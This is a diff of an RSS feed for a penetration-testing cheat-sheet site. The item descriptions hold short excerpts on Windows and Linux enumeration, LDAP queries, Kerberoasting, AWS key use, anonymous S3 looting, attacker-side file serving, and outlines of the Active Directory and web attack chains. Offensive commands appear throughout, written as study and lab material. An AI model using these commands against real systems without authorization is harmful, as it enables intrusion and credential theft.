+Bulk download if anon read works:</description></item><item><title>Local Enum</title><link>https://jinpwn.dev/cheatsheets/windows/w02-local-enum/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/windows/w02-local-enum/</guid><description>First moves after foothold on Windows. Same idea as Linux Local Enum but different commands. AD-joined hosts also need AD MOC enum.
 i. The first 60 seconds # whoami whoami /priv whoami /groups whoami /all hostname [System.Environment]::OSVersion.Version systeminfo | findstr /B /C:&amp;#34;OS Name&amp;#34; /C:&amp;#34;OS Version&amp;#34; /C:&amp;#34;System Type&amp;#34; /C:&amp;#34;Domain&amp;#34; $env:USERDOMAIN $env:LOGONSERVER What to look at:
-whoami /priv -&amp;gt; any Enabled privilege that maps to GodPotato / SeBackup etc, see PrivEsc - Tokens &amp;amp; Privileges whoami /groups -&amp;gt; Administrators, Backup Operators, DnsAdmins, Hyper-V Admins all = high-value systeminfo Domain field -&amp;gt; joined to AD, see AD MOC ii. Users and groups # net user net user Administrator net localgroup net localgroup Administrators net accounts ## password policy PowerShell:
-</description>
-    </item>
-    <item>
-      <title>LDAP</title>
-      <link>https://jinpwn.dev/cheatsheets/misc/ldap/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/misc/ldap/</guid>
-      <description>LDAP enum against Active Directory and standalone directories. AD-specific attacks (kerberoast, ASREP, ACL abuse) live in 00 AD MOC .
+whoami /priv -&amp;gt; any Enabled privilege that maps to GodPotato / SeBackup etc, see PrivEsc - Tokens &amp;amp; Privileges whoami /groups -&amp;gt; Administrators, Backup Operators, DnsAdmins, Hyper-V Admins all = high-value systeminfo Domain field -&amp;gt; joined to AD, see AD MOC ii. Users and groups # net user net user Administrator net localgroup net localgroup Administrators net accounts ## password policy PowerShell:</description></item><item><title>LDAP</title><link>https://jinpwn.dev/cheatsheets/misc/ldap/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/misc/ldap/</guid><description>LDAP enum against Active Directory and standalone directories. AD-specific attacks (kerberoast, ASREP, ACL abuse) live in 00 AD MOC .
 DC=10.10.11.50 DOMAIN=corp.local BASE=&amp;#39;DC=corp,DC=local&amp;#39; USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Anonymous bind # Lot of misconfigured DCs allow anonymous read. Always try first.
 ldapsearch -x -H ldap://$DC -s base namingcontexts ldapsearch -x -H ldap://$DC -b &amp;#34;$BASE&amp;#34; What to grep for in anonymous output:
-ldapsearch -x -H ldap://$DC -b &amp;#34;$BASE&amp;#34; | grep -iE &amp;#39;description|userpassword|info|comment&amp;#39; ii. Authenticated bind # ldapsearch -x -H ldap://$DC -D &amp;#34;$USER@$DOMAIN&amp;#34; -w &amp;#34;$PASS&amp;#34; -b &amp;#34;$BASE&amp;#34; Over LDAPS (encrypted, needed for password changes and some attacks):
-</description>
-    </item>
-    <item>
-      <title>Kerberoasting</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/ad03-kerberoasting/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad03-kerberoasting/</guid>
-      <description>Request TGS for any user account that has an SPN, get back a hash encrypted with the user&amp;rsquo;s NT key. Crack offline.
+ldapsearch -x -H ldap://$DC -b &amp;#34;$BASE&amp;#34; | grep -iE &amp;#39;description|userpassword|info|comment&amp;#39; ii. Authenticated bind # ldapsearch -x -H ldap://$DC -D &amp;#34;$USER@$DOMAIN&amp;#34; -w &amp;#34;$PASS&amp;#34; -b &amp;#34;$BASE&amp;#34; Over LDAPS (encrypted, needed for password changes and some attacks):</description></item><item><title>Kerberoasting</title><link>https://jinpwn.dev/cheatsheets/active-directory/ad03-kerberoasting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/ad03-kerberoasting/</guid><description>Request TGS for any user account that has an SPN, get back a hash encrypted with the user&amp;rsquo;s NT key. Crack offline.
 DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Find Kerberoastable users # BloodHound query, see BloodHound :
 MATCH (u:User {hasspn: true, enabled: true}) RETURN u.name, u.serviceprincipalnames nxc shortcut, dump SPN candidates:
-nxc ldap $DC -u $USER -p $PASS --get-sid ## helps disambiguate nxc ldap $DC -u $USER -p $PASS --kerberoasting roast.txt bloodyAD LDAP filter:
-</description>
-    </item>
-    <item>
-      <title>AWS</title>
-      <link>https://jinpwn.dev/cheatsheets/cloud/aws/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/cloud/aws/</guid>
-      <description>AWS attack surface. Storage in Cloud Storage , external recon in Cloud Recon . This file covers what to do once you have credentials or are inside an AWS account.
+nxc ldap $DC -u $USER -p $PASS --get-sid ## helps disambiguate nxc ldap $DC -u $USER -p $PASS --kerberoasting roast.txt bloodyAD LDAP filter:</description></item><item><title>AWS</title><link>https://jinpwn.dev/cheatsheets/cloud/aws/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/cloud/aws/</guid><description>AWS attack surface. Storage in Cloud Storage , external recon in Cloud Recon . This file covers what to do once you have credentials or are inside an AWS account.
 i. Set up identity # Found keys (from leaked configs, IMDS, etc):
 export AWS_ACCESS_KEY_ID=AKIA... export AWS_SECRET_ACCESS_KEY=... export AWS_SESSION_TOKEN=... ## only for ASIA... temp creds export AWS_DEFAULT_REGION=us-east-1 Or use a profile:
-aws configure --profile target ## Then prefix everything with --profile target Confirm identity:
-</description>
-    </item>
-    <item>
-      <title>Recon &amp; Enum</title>
-      <link>https://jinpwn.dev/cheatsheets/windows/w01-recon--enum/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/windows/w01-recon--enum/</guid>
-      <description>External enum against a Windows target. Service deep-dives overlap with Service Enum but Windows hosts open a different set of ports.
+aws configure --profile target ## Then prefix everything with --profile target Confirm identity:</description></item><item><title>Recon &amp; Enum</title><link>https://jinpwn.dev/cheatsheets/windows/w01-recon--enum/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/windows/w01-recon--enum/</guid><description>External enum against a Windows target. Service deep-dives overlap with Service Enum but Windows hosts open a different set of ports.
 T=10.10.11.50 i. Port scan, Windows fingerprint # nmap -p- --min-rate 10000 -T4 -Pn -n -oG fast.gnmap &amp;#34;$T&amp;#34; PORTS=$(grep -oP &amp;#39;\d+/open&amp;#39; fast.gnmap | cut -d/ -f1 | paste -sd,) nmap -p&amp;#34;$PORTS&amp;#34; -sCV -Pn -n -oA full &amp;#34;$T&amp;#34; Ports that suggest Windows:
-88 Kerberos -&amp;gt; Domain Controller, see AD MOC 135 MSRPC endpoint mapper 139, 445 SMB / NetBIOS 389, 636, 3268, 3269 LDAP / Global Catalog -&amp;gt; DC 464 kpasswd -&amp;gt; DC 593 RPC over HTTP 3389 RDP 5985, 5986 WinRM (HTTP, HTTPS) 47001 WinRM HTTP listener 49152-65535 RPC dynamic range DC vs member server: 88 + 389 + 445 + 53 open -&amp;gt; almost certainly a DC.
-</description>
-    </item>
-    <item>
-      <title>Recon &amp; Enum</title>
-      <link>https://jinpwn.dev/cheatsheets/linux-pentesting/01-recon--enum/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/linux-pentesting/01-recon--enum/</guid>
-      <description>Host discovery and port scanning on a Linux target. Service-specific enum lives in 02 Service Enum Set the target once so every block reuses it:
+88 Kerberos -&amp;gt; Domain Controller, see AD MOC 135 MSRPC endpoint mapper 139, 445 SMB / NetBIOS 389, 636, 3268, 3269 LDAP / Global Catalog -&amp;gt; DC 464 kpasswd -&amp;gt; DC 593 RPC over HTTP 3389 RDP 5985, 5986 WinRM (HTTP, HTTPS) 47001 WinRM HTTP listener 49152-65535 RPC dynamic range DC vs member server: 88 + 389 + 445 + 53 open -&amp;gt; almost certainly a DC.</description></item><item><title>Recon &amp; Enum</title><link>https://jinpwn.dev/cheatsheets/linux-pentesting/01-recon--enum/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/linux-pentesting/01-recon--enum/</guid><description>Host discovery and port scanning on a Linux target. Service-specific enum lives in 02 Service Enum Set the target once so every block reuses it:
 T=10.10.11.50 RANGE=10.10.11.0/24 i. Host discovery on the LAN # ARP sweep, only works on your own L2 segment, most reliable:
 nmap -n -sn -PR -oG - &amp;#34;$RANGE&amp;#34; | grep Up ICMP sweep with parallel ping when ARP is not an option:
-seq 1 254 | xargs -P50 -I{} ping -c1 -W1 10.10.11.{} 2&amp;gt;/dev/null | grep &amp;#39;bytes from&amp;#39; | awk &amp;#39;{print $4}&amp;#39; | tr -d : Pure bash TCP knock, no tools needed on the host:
-</description>
-    </item>
-    <item>
-      <title>File Transfer</title>
-      <link>https://jinpwn.dev/cheatsheets/misc/file-transfer/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/misc/file-transfer/</guid>
-      <description>Move files between attacker and target. Pick the method that survives the network you are in.
+seq 1 254 | xargs -P50 -I{} ping -c1 -W1 10.10.11.{} 2&amp;gt;/dev/null | grep &amp;#39;bytes from&amp;#39; | awk &amp;#39;{print $4}&amp;#39; | tr -d : Pure bash TCP knock, no tools needed on the host:</description></item><item><title>File Transfer</title><link>https://jinpwn.dev/cheatsheets/misc/file-transfer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/misc/file-transfer/</guid><description>Move files between attacker and target. Pick the method that survives the network you are in.
 LHOST=10.10.14.1 i. Serve from attacker # Python HTTP, no uploads:
 python3 -m http.server 80 Python HTTP with upload support, accepts POST to /upload:
 pip install uploadserver python3 -m uploadserver 80 SMB share, useful for Windows targets that block HTTP egress:
-impacket-smbserver share . -smb2support ## guest access impacket-smbserver share . -smb2support -user u -password p ## auth required PHP HTTP, when python is missing:
-</description>
-    </item>
-    <item>
-      <title>Cloud Storage</title>
-      <link>https://jinpwn.dev/cheatsheets/cloud/cloud-storage/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/cloud/cloud-storage/</guid>
-      <description>S3, Azure Blob, GCS - same idea, three implementations. Public buckets, weak ACLs, exposed objects, pre-signed URL leaks.
-DOMAIN=target.com BUCKET=target-prod-assets i. AWS S3 # Anonymous access tests # ## List bucket contents (anonymous): curl &amp;#34;https://$BUCKET.s3.amazonaws.com/&amp;#34; curl &amp;#34;https://s3.amazonaws.com/$BUCKET/&amp;#34; ## Both formats work. Different responses tell you about region restrictions. ## With aws CLI (no credentials needed for public): aws s3 ls &amp;#34;s3://$BUCKET/&amp;#34; --no-sign-request aws s3 cp &amp;#34;s3://$BUCKET/file.txt&amp;#34; - --no-sign-request ## Recursive download of everything readable: aws s3 sync &amp;#34;s3://$BUCKET/&amp;#34; ./loot --no-sign-request Status codes:
-</description>
-    </item>
-    <item>
-      <title>Cloud Recon</title>
-      <link>https://jinpwn.dev/cheatsheets/cloud/cloud-recon/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/cloud/cloud-recon/</guid>
-      <description>Identify cloud assets that belong to a target before authenticating to anything. Builds on Recon (External) but focuses on cloud-specific fingerprints.
+impacket-smbserver share . -smb2support ## guest access impacket-smbserver share . -smb2support -user u -password p ## auth required PHP HTTP, when python is missing:</description></item><item><title>Cloud Storage</title><link>https://jinpwn.dev/cheatsheets/cloud/cloud-storage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/cloud/cloud-storage/</guid><description>S3, Azure Blob, GCS - same idea, three implementations. Public buckets, weak ACLs, exposed objects, pre-signed URL leaks.
+DOMAIN=target.com BUCKET=target-prod-assets i. AWS S3 # Anonymous access tests # ## List bucket contents (anonymous): curl &amp;#34;https://$BUCKET.s3.amazonaws.com/&amp;#34; curl &amp;#34;https://s3.amazonaws.com/$BUCKET/&amp;#34; ## Both formats work. Different responses tell you about region restrictions. ## With aws CLI (no credentials needed for public): aws s3 ls &amp;#34;s3://$BUCKET/&amp;#34; --no-sign-request aws s3 cp &amp;#34;s3://$BUCKET/file.txt&amp;#34; - --no-sign-request ## Recursive download of everything readable: aws s3 sync &amp;#34;s3://$BUCKET/&amp;#34; ./loot --no-sign-request Status codes:</description></item><item><title>Cloud Recon</title><link>https://jinpwn.dev/cheatsheets/cloud/cloud-recon/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/cloud/cloud-recon/</guid><description>Identify cloud assets that belong to a target before authenticating to anything. Builds on Recon (External) but focuses on cloud-specific fingerprints.
 DOMAIN=target.com ORG=&amp;#39;Target Inc&amp;#39; i. Find the cloud netblocks # Cloud providers publish their ASN ranges. Cross-reference with target&amp;rsquo;s known IPs to identify cloud presence.
 AWS ranges:
 curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | jq -r &amp;#39;.prefixes[] | &amp;#34;\(.ip_prefix) \(.region) \(.service)&amp;#34;&amp;#39; Azure ranges:
-## Microsoft publishes weekly JSON files at: ## https://www.microsoft.com/en-us/download/details.aspx?id=56519 ## Search engine query: &amp;#34;Azure IP Ranges and Service Tags Public Cloud&amp;#34; GCP ranges:
-</description>
-    </item>
-    <item>
-      <title>BloodHound</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/ad02-bloodhound/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad02-bloodhound/</guid>
-      <description>Graph the domain, find the shortest path. BloodHound CE is the current default (BloodHound Legacy and SharpHound are deprecated for new work).
+## Microsoft publishes weekly JSON files at: ## https://www.microsoft.com/en-us/download/details.aspx?id=56519 ## Search engine query: &amp;#34;Azure IP Ranges and Service Tags Public Cloud&amp;#34; GCP ranges:</description></item><item><title>BloodHound</title><link>https://jinpwn.dev/cheatsheets/active-directory/ad02-bloodhound/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/ad02-bloodhound/</guid><description>Graph the domain, find the shortest path. BloodHound CE is the current default (BloodHound Legacy and SharpHound are deprecated for new work).
 DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Spin up BloodHound CE # Docker compose, one-shot:
-curl -L https://ghst.ly/getbhce -o docker-compose.yml docker-compose up -d ## Wait 30s, then watch logs for the initial admin password: docker-compose logs bloodhound | grep &amp;#34;Initial Password Set To&amp;#34; ## UI: http://127.0.0.1:8080 user: admin pw: (from log) CE vs Legacy rusthound-ce, bloodyAD get bloodhound, and modern nxc all output CE-format JSON. Old SharpHound and bloodhound-python output Legacy format. Don&amp;rsquo;t mix, your edges will be missing or mislabeled.
-</description>
-    </item>
-    <item>
-      <title>Auth &amp; Session</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web02-auth--session/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web02-auth--session/</guid>
-      <description>Bypass auth, hijack sessions, attack JWTs, spray creds, break OAuth/SAML flows.
+curl -L https://ghst.ly/getbhce -o docker-compose.yml docker-compose up -d ## Wait 30s, then watch logs for the initial admin password: docker-compose logs bloodhound | grep &amp;#34;Initial Password Set To&amp;#34; ## UI: http://127.0.0.1:8080 user: admin pw: (from log) CE vs Legacy rusthound-ce, bloodyAD get bloodhound, and modern nxc all output CE-format JSON. Old SharpHound and bloodhound-python output Legacy format. Don&amp;rsquo;t mix, your edges will be missing or mislabeled.</description></item><item><title>Auth &amp; Session</title><link>https://jinpwn.dev/cheatsheets/web/web02-auth--session/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web02-auth--session/</guid><description>Bypass auth, hijack sessions, attack JWTs, spray creds, break OAuth/SAML flows.
 T=https://target.com i. Where it lives # Surfaces to check on every web app:
-Login form (username/password, plus the API endpoint behind it) Registration (often enumerates valid usernames) Password reset (token analysis, timing, host header injection) &amp;ldquo;Remember me&amp;rdquo; cookies, session cookies, CSRF tokens JWTs anywhere (Authorization header, cookies, localStorage) OAuth callbacks, SAML assertions, OpenID flows MFA challenge endpoints API tokens, refresh tokens ii. User enumeration # Different responses for valid vs invalid usernames are the first crack in the wall.
-</description>
-    </item>
-    <item>
-      <title>Windows MOC</title>
-      <link>https://jinpwn.dev/cheatsheets/windows/00-windows-moc/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/windows/00-windows-moc/</guid>
-      <description>Local Windows host work. Domain attacks live in AD MOC .
-Enumerate # Recon &amp;amp; Enum Local Enum Escalate # PrivEsc - Tokens &amp;amp; Privileges PrivEsc - Services &amp;amp; Registry PrivEsc - DLL &amp;amp; Unquoted Paths PrivEsc - Credentials &amp;amp; Files UAC Bypass PrivEsc - Kernel &amp;amp; Exploits Living off the land # LOLBAS Defender &amp;amp; AMSI Evasion Move # Lateral Movement then AD MOC Scope If the host is domain joined, local privesc is often just the step before AD MOC . Loot creds, then pivot to the domain.
-</description>
-    </item>
-    <item>
-      <title>Tooling MOC</title>
-      <link>https://jinpwn.dev/cheatsheets/misc/00-tooling-moc/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/misc/00-tooling-moc/</guid>
-      <description>Index of tools referenced across the library. One-liner per tool, when to reach for it.</description>
-    </item>
-    <item>
-      <title>Linux MOC</title>
-      <link>https://jinpwn.dev/cheatsheets/linux-pentesting/00-linux-moc/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/linux-pentesting/00-linux-moc/</guid>
-      <description>Lifecycle flow for a Linux host. Scan top to bottom.
-Enumerate # Recon &amp;amp; Enum Service Enum Access # Shell &amp;amp; Tooling Initial Access Escalate # Local Enum PrivEsc - SUID &amp;amp; Sudo PrivEsc - Cron &amp;amp; Timers PrivEsc - Capabilities PrivEsc - Services &amp;amp; Sockets PrivEsc - Kernel &amp;amp; Exploits PrivEsc - Credentials &amp;amp; Files Move # Pivoting Persistence &amp;amp; Cleanup Decision order Enum surface, grab cheapest privesc win (sudo, suid, caps), only reach for kernel exploits when nothing else lands.
-</description>
-    </item>
-    <item>
-      <title>Enumeration</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/ad01-enumeration/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad01-enumeration/</guid>
-      <description>AD enum, pre-auth and post-auth. LDAP filter-level work is in LDAP . Local Windows host enum is in Local Enum .
+Login form (username/password, plus the API endpoint behind it) Registration (often enumerates valid usernames) Password reset (token analysis, timing, host header injection) &amp;ldquo;Remember me&amp;rdquo; cookies, session cookies, CSRF tokens JWTs anywhere (Authorization header, cookies, localStorage) OAuth callbacks, SAML assertions, OpenID flows MFA challenge endpoints API tokens, refresh tokens ii. User enumeration # Different responses for valid vs invalid usernames are the first crack in the wall.</description></item><item><title>Windows MOC</title><link>https://jinpwn.dev/cheatsheets/windows/00-windows-moc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/windows/00-windows-moc/</guid><description>Local Windows host work. Domain attacks live in AD MOC .
+Enumerate # Recon &amp;amp; Enum Local Enum Escalate # PrivEsc - Tokens &amp;amp; Privileges PrivEsc - Services &amp;amp; Registry PrivEsc - DLL &amp;amp; Unquoted Paths PrivEsc - Credentials &amp;amp; Files UAC Bypass PrivEsc - Kernel &amp;amp; Exploits Living off the land # LOLBAS Defender &amp;amp; AMSI Evasion Move # Lateral Movement then AD MOC Scope If the host is domain joined, local privesc is often just the step before AD MOC . Loot creds, then pivot to the domain.</description></item><item><title>Tooling MOC</title><link>https://jinpwn.dev/cheatsheets/misc/00-tooling-moc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/misc/00-tooling-moc/</guid><description>Index of tools referenced across the library. One-liner per tool, when to reach for it.</description></item><item><title>Linux MOC</title><link>https://jinpwn.dev/cheatsheets/linux-pentesting/00-linux-moc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/linux-pentesting/00-linux-moc/</guid><description>Lifecycle flow for a Linux host. Scan top to bottom.
+Enumerate # Recon &amp;amp; Enum Service Enum Access # Shell &amp;amp; Tooling Initial Access Escalate # Local Enum PrivEsc - SUID &amp;amp; Sudo PrivEsc - Cron &amp;amp; Timers PrivEsc - Capabilities PrivEsc - Services &amp;amp; Sockets PrivEsc - Kernel &amp;amp; Exploits PrivEsc - Credentials &amp;amp; Files Move # Pivoting Persistence &amp;amp; Cleanup Decision order Enum surface, grab cheapest privesc win (sudo, suid, caps), only reach for kernel exploits when nothing else lands.</description></item><item><title>Enumeration</title><link>https://jinpwn.dev/cheatsheets/active-directory/ad01-enumeration/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/ad01-enumeration/</guid><description>AD enum, pre-auth and post-auth. LDAP filter-level work is in LDAP . Local Windows host enum is in Local Enum .
 DC=10.10.11.50 DOMAIN=corp.local BASE=&amp;#39;DC=corp,DC=local&amp;#39; USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; NTHASH=&amp;#39;8846f7eaee8fb117ad06bdd830b7586c&amp;#39; 0. Pre-flight: hosts file and krb5 config # Do this once per engagement before any other AD work. Kerberos and SPN-based tools all expect FQDN resolution.
 Generate /etc/hosts entries from the DC&amp;rsquo;s LDAP info:
-nxc smb $DC --generate-hosts-file h &amp;amp;&amp;amp; sudo tee -a /etc/hosts &amp;lt; h &amp;amp;&amp;amp; rm h This pulls hostname, FQDN, and IPs from the SMB banner and writes them in /etc/hosts format. Run it for every new DC or important host you discover. Verify:
-</description>
-    </item>
-    <item>
-      <title>Content Discovery</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web01-content-discovery/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web01-content-discovery/</guid>
-      <description>Find every hidden path, parameter, vhost, and file the app didn&amp;rsquo;t link to. Done well, this finds 80% of the bugs before any &amp;ldquo;real&amp;rdquo; testing.
+nxc smb $DC --generate-hosts-file h &amp;amp;&amp;amp; sudo tee -a /etc/hosts &amp;lt; h &amp;amp;&amp;amp; rm h This pulls hostname, FQDN, and IPs from the SMB banner and writes them in /etc/hosts format. Run it for every new DC or important host you discover. Verify:</description></item><item><title>Content Discovery</title><link>https://jinpwn.dev/cheatsheets/web/web01-content-discovery/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web01-content-discovery/</guid><description>Find every hidden path, parameter, vhost, and file the app didn&amp;rsquo;t link to. Done well, this finds 80% of the bugs before any &amp;ldquo;real&amp;rdquo; testing.
 T=https://target.com WL=/usr/share/wordlists/seclists i. Where it lives # Standard surfaces to brute-force:
-Path enumeration (directories + files) Parameter mining (GET, POST body, JSON keys, headers) Vhost discovery (Host header tricks) JS endpoint extraction (URLs and APIs referenced in JS bundles) Subdomain enumeration (see [[Recon (external)]]) Archive endpoints (waybackmachine, gau, hakrawler) ii. Path fuzzing # ffuf is the default, fastest and most flexible:
-</description>
-    </item>
-    <item>
-      <title>Cloud MOC</title>
-      <link>https://jinpwn.dev/cheatsheets/cloud/00-cloud-moc/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/cloud/00-cloud-moc/</guid>
-      <description>Cloud provider attack surface.</description>
-    </item>
-    <item>
-      <title>Web MOC</title>
-      <link>https://jinpwn.dev/cheatsheets/web/00-web-moc/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/00-web-moc/</guid>
-      <description>Web application attack chain. Find hidden surfaces, break auth, inject everything.
-Recon # Content Discovery Auth # Auth &amp;amp; Session Injection # SQL Injection NoSQL Injection Command Injection SSTI XXE Client-side # XSS CSRF &amp;amp; CORS Protocol-level # Request Smuggling Web Cache Poisoning SSRF Code execution # File Upload &amp;amp; LFI Deserialization Prototype Pollution Flow Content discovery first, then test auth. Work injection classes top to bottom. Command injection and SSTI are the fastest paths to shell. File upload and deserialization for RCE when injection doesn&amp;rsquo;t land.
-</description>
-    </item>
-    <item>
-      <title>AD MOC</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/</guid>
-      <description>Full attack chain for Active Directory. Local Windows privesc is in Windows MOC .
-Recon # Enumeration BloodHound Credential access # Kerberoasting AS-REP Roasting Password Spraying LLMNR &amp;amp; NTLM Relay ACL and object abuse # ACL Abuse Delegation ADCS ESC1-16 Movement and dumping # Lateral Movement Credential Dumping DCSync Trust and persistence # Trust Attacks Persistence Support # LDAP Password Cracking Pivoting Flow Enum to BloodHound, find the shortest path, abuse the edge, dump, repeat until DA or cross trust.
-</description>
-    </item>
-  </channel>
-</rss>
+Path enumeration (directories + files) Parameter mining (GET, POST body, JSON keys, headers) Vhost discovery (Host header tricks) JS endpoint extraction (URLs and APIs referenced in JS bundles) Subdomain enumeration (see Recon (external) ) Archive endpoints (waybackmachine, gau, hakrawler) ii. Path fuzzing # ffuf is the default, fastest and most flexible:</description></item><item><title>Cloud MOC</title><link>https://jinpwn.dev/cheatsheets/cloud/00-cloud-moc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/cloud/00-cloud-moc/</guid><description>Cloud provider attack surface.</description></item><item><title>Web MOC</title><link>https://jinpwn.dev/cheatsheets/web/00-web-moc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/00-web-moc/</guid><description>Web application attack chain. Find hidden surfaces, break auth, inject everything.
+Recon # Content Discovery Auth # Auth &amp;amp; Session Injection # SQL Injection NoSQL Injection Command Injection SSTI XXE Client-side # XSS CSRF &amp;amp; CORS Protocol-level # Request Smuggling Web Cache Poisoning SSRF Code execution # File Upload &amp;amp; LFI Deserialization Prototype Pollution Flow Content discovery first, then test auth. Work injection classes top to bottom. Command injection and SSTI are the fastest paths to shell. File upload and deserialization for RCE when injection doesn&amp;rsquo;t land.</description></item><item><title>AD MOC</title><link>https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/</guid><description>Full attack chain for Active Directory. Local Windows privesc is in Windows MOC .
+Recon # Enumeration BloodHound Credential access # Kerberoasting AS-REP Roasting Password Spraying LLMNR &amp;amp; NTLM Relay ACL and object abuse # ACL Abuse Delegation ADCS ESC1-16 Movement and dumping # Lateral Movement Credential Dumping DCSync Trust and persistence # Trust Attacks Persistence Support # LDAP Password Cracking Pivoting Flow Enum to BloodHound, find the shortest path, abuse the edge, dump, repeat until DA or cross trust.</description></item></channel></rss>
